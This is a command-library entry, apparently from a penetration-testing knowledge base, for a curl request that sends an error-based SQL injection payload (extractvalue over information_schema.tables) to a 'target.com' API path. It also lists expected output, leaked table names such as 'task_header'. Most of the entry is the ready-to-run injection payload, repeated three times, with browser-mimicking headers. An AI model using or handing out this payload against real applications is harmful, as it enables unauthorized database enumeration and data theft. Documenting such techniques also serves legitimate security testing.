---
id: cmd-uuid-004
name: curl-extract-tables
type: command
executor: bash
data: >-
  curl -X GET
  "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from
  information_schema.tables limit 54,1))))='" -H "User-Agent: Mozilla/5.0
  (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding:
  gzip, deflate" -H "Upgrade-Insecure-Requests: 1" --compressed
output: >-
  Error message leaking table names such as 'task_header',
  'employee_formal_training', etc. from database
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.480Z'
platforms:
  - Linux
  - Web
tags:
  - sqli
  - curl
verified: false
validated: true
submitted: true
---

# curl-extract-tables

## Command

```bash
curl -X GET "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from information_schema.tables limit 54,1))))='" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Upgrade-Insecure-Requests: 1" --compressed
```

## Description

Extracts table names using information_schema.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Method | Yes |
| URL | Payload with LIMIT | Yes |
| `-H` | Headers | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from information_schema.tables limit 54,1))))='"
```

## Expected Output

Error with table names.

## Related

- [[Related Procedure: Extract-Table-Names-from-Information-Schema]]
